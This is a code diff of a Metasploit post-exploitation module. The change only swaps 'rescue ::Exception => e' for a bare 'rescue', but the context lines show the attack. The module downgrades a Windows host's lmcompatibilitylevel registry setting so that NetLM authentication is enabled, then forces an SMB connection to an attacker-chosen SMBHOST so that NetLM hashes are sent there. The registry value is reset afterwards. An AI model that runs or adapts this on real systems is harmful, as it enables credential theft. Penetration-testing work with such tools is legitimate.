@@ -50,7 +50,7 @@ class Metasploit3 < Msf::Post
 			print_status("Establishing SMB connection to " + datastore['SMBHOST'])
 			cmd_exec("cmd.exe","/c net use * \\\\#{datastore['SMBHOST']}\\ipc$")
 			print_status("The SMBHOST should now have NetLM hashes")
-		rescue ::Exception => e
+		rescue
 			print_error("Issues establishing SMB connection")
 		end
 	end
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Post
 			v_name = "lmcompatibilitylevel"
 			begin
 				netlm = registry_getvaldata(subkey, v_name)
-			rescue ::Exception => e
+			rescue
 				print_error("Issues enumerating registry values")
 			end
 
@@ -80,14 +80,14 @@ class Metasploit3 < Msf::Post
 				begin
 					print_status("NetLM is Disabled: #{subkey}#{v_name} == #{netlm.to_s}")
 					registry_setvaldata(subkey,v_name,0,"REG_DWORD")
-				rescue ::Exception => e
+				rescue
 					print_error("Issues modifying registry value")
 				end
 
 				begin
 					post_netlm = registry_getvaldata(subkey, v_name)
 					print_good("NetLM is Enabled:  #{subkey}#{v_name} == #{post_netlm.to_s}")
-				rescue ::Exception => e
+				rescue
 					print_error("Issues enumerating registry values")
 				end
 
@@ -98,7 +98,7 @@ class Metasploit3 < Msf::Post
 				begin
 					registry_setvaldata(subkey,v_name,netlm,"REG_DWORD")
 					print_status("Cleanup Completed: #{subkey}#{v_name} == #{netlm.to_s}")
-				rescue ::Exception => e
+				rescue
 					print_error("Issues cleaning up registry changes")
 				end
 			end
